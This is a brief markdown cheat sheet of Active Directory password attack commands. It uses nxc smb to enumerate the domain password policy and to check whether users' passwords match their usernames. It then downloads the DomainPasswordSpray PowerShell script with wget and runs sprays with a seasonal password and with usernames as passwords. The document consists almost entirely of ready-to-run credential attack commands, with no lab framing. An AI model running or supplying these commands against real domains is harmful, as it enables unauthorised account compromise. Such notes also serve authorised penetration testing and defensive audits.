## Enumerating Password Policy inside the domain
- using `nxc smb`
```shell
nxc smb <domain-name> -u myuser -p hispasswd --pass-pol
```

## check if anyone using his username as his password?
```shell
nxc smb domain.name -u users.txt -p users.txt --continue-on-success # optional to grep on the success [grep '+']
```

## using InvokeDomainPasswordSpray 
```powershell
wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/refs/heads/master/DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Summer2025!  -UserList .\users.txt -Force
Invoke-DomainPasswordSpray -UsernameAsPassword -UserList .\users.txt
```
